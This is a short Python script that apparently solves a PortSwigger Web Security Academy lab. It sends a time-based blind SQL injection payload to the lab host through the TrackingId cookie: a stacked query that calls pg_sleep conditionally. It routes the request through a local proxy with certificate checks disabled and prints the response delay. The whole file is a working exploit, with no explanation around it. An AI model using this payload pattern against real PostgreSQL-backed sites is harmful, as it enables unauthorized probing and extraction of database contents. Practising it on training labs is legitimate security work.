#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {"Host": "acda1f461edf6e8ac0737b1300ff0092.web-security-academy.net",
"Cookie": "TrackingId=JBJXvGIplT4nR89w'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--; session=uVH6yFt0c51UZM0c7pTjLDUAExIXJDRJ"}

url = "https://acda1f461edf6e8ac0737b1300ff0092.web-security-academy.net"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
#timedelay = str(r.elapsed.total_seconds())[0]
print(str(r.elapsed.total_seconds())[0:2])

# if int(timedelay) >= 3:
#     print("Three seconds!")